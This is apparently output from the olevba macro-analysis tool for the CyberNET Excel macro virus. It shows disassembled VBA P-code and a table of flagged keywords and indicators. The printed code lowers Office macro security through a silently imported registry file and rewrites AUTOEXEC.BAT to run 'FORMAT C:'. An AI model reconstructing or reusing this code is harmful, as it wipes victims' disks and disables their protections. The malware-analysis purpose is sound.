' 	LitStr 0x0047 "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
' 	PrintItemNL 
' Line #206:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #207:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #208:
' 	ElseBlock 
' Line #209:
' 	LitStr 0x000F "C:\CyberNET.reg"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #211:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0040 "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
' 	PrintItemNL 
' Line #212:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #213:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #214:
' 	EndIfBlock 
' Line #215:
' 	EndIfBlock 
' Line #216:
' 	LitStr 0x001E "Regedit.exe /S C:\CyberNET.reg"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #217:
' 	ArgsCall (Call) GP1055 0x0000 
' Line #218:
' 	LitStr 0x0020 "ThisWorkbook.Workbook_Deactivate"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #219:
' 	EndSub 
' Line #220:
' 	FuncDefn (Private Function HG3579(id_FFFE As Variant))
' Line #221:
' 	OnError (Resume Next) 
' Line #222:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	Paren 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #223:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #224:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0054 "ECHO ###############################################################################"
' 	PrintItemNL 
' Line #225:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0054 "ECHO #                                                                             #"
' 	PrintItemNL 
' Line #226:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0054 "ECHO #               Vine...Vide...Vice...Moslem Power Never End...                #"
' 	PrintItemNL 
' Line #227:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0054 "ECHO # I'm Really Sorry, This System Have Been Recycled By -= CyberNET =- Virus!!! #"
' 	PrintItemNL 
' Line #228:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0054 "ECHO #                     Brought To You From INDONESIA...                        #"
' 	PrintItemNL 
' Line #229:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0054 "ECHO #                                                                             #"
' 	PrintItemNL 
' Line #230:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0054 "ECHO ###############################################################################"
' 	PrintItemNL 
' Line #231:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "CTTY NUL"
' 	PrintItemNL 
' Line #232:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "FORMAT C: /AUTOTEST /Q /U"
' 	PrintItemNL 
' Line #233:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #234:
' 	LitStr 0x000D "C:\CONFIG.SYS"
' 	Paren 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #235:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "SWITCHES=/N"
' 	PrintItemNL 
' Line #236:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "BREAK=OFF"
' 	PrintItemNL 
' Line #237:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #238:
' 	LitStr 0x003B "Assalamualaikum Li Kulli Muslim...Moslem Power Never End..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x004B "Nothing Can Stop << CyberNET >> Virus. Your System Has Already Infected !!!"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0018 "Now...I Am Outta Here..."
' 	Concat 
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0012 "(C)2000 - CyberNET"
' 	ArgsCall MsgBox 0x0003 
' Line #239:
' 	LitStr 0x001F "RUNDLL.EXE user.exe,exitwindows"
' 	Paren 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #240:
' 	EndFunc 
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' _VBA_PROJECT_CUR/VBA/Sheet1 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet2 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet3 - 957 bytes
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |CyberNET.reg        |Executable file name                         |
|IOC       |CYBERNET.REG        |Executable file name                         |
|IOC       |Regedit.exe         |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

